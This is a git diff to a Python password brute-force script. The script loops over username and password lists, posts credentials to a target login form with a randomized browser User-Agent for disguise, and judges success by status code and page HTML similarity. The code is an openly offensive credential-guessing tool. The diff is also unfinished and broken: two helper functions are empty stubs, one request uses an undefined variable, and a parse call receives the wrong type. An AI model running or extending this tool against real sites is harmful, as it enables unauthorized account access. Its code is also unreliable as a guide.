@@ -22,10 +22,12 @@ def brute(parameters, passwords):
                'password_param': parameters['password_param'],
                'action' : parameters['action'],
                'headers': parameters['req_header'],
-               'static_elements': parameters['static_elements'],
-               'host': parameters['host']
+               'host': parameters['host'],
+               'req_body' : parameters['req_body'],
                }
 
+    req_body_type = get_req_type(content['req_header'])
+    
     # if userlist is provided then checks if passwordlist is provided or just 1 password
     if parameters['user_list']:
         for user in parameters['user_list']:
@@ -37,6 +39,7 @@ def brute(parameters, passwords):
                     password = password.strip()
                     password = password.split('\t')
                     content['password'] = password[0]
+                    content = change_cred(content['req_body'], content['username'], content['password'], req_body_type)
                     attack(content)
             else:
                 content['password'] = parameters['password']
@@ -55,9 +58,11 @@ def brute(parameters, passwords):
         content['password'] = parameters['password']
         attack(content)
         
+def get_req_type(type):
+    pass
 
-
-
+def change_cred(req_body, username, password, req_body_type):
+    pass
 
 def attack(content):
     '''
@@ -69,26 +74,23 @@ def attack(content):
     # build packet headers in order to disguise as a browser
     headers = content['headers']
     headers['User-Agent'] = get_random_user_agent()
-    print()
-    print()
-    print(headers['User-Agent'])
-    print()
-    print()
+    payload = content['req_body']
     
-    payload = {
-        content['user_param']: content['username'],
-        content['password_param']: content['password']
-    }
-    payload.update(content['static_elements'])
+    import urllib
+    # convert from json to encoded
+    urllib.parse.urlencode(payload)
+    # convert from encoded to json
+    res = urllib.parse.parse_qs(payload)
 
+
+    res = requests.get(url)
     if content['method'] == 'post':
-        resp = requests.post(content['host'], data=payload, headers=headers)
+        resp = requests.post(content['host'], data=payload)
     else:
         resp = requests.get(url,data=payload,headers=headers)
-
     print('[+][attack] trying' + ' username:' + content['username'] + ' password:' + content['password'])
-    # print(resp.text)
-    if check_login(resp, content['password_param']):
+    print(resp.status_code)
+    if check_login(resp, res):
         print('login successfull\n\nusername: ' + content['username'] + '\npassword: ' + content['password'])
         global success
         success = True
@@ -119,21 +121,24 @@ def get_random_user_agent():
         return random_proxy[0:len(random_proxy) - 2]
 
 
-def check_login(content, password_param):
+def check_login(content_1, content_2):
     '''
-    checks if login was successful by checking if status code is 200 and if the password field that
-    is contained in the login form is no longer found in the page source
+    checks if login was successful by checking if status code is 200 or 302 and if the html similarity of the login
+    page and the page after sending the credintials is bellow 70% + the response content is lager the the login page content
     '''
-    read = content.text
-    doc = html.document_fromstring(read)
-    element = doc.xpath('//input[@type="password"]')
-
-    for field in element:
-        if field.get('name') == password_param:
-            return False
-
-    if content.status_code != 200:
+    from html_similarity import style_similarity, structural_similarity, similarity
+    k=0.3
+    similarity = k * structural_similarity(content_1.text, content_2.text) + (1 - k) * style_similarity(content_1.text, content_2.text)
+    
+    if  content_1.status_code > 400:
         return False
-    else:
+    
+    elif similarity < 0.7 and len(content_1.text) > len(content_2.text):
         return True
+    
+    elif  content_1.status_code == 201 or content_1.status_code == 302:
+        return True
+
+    else:
+        return False
 
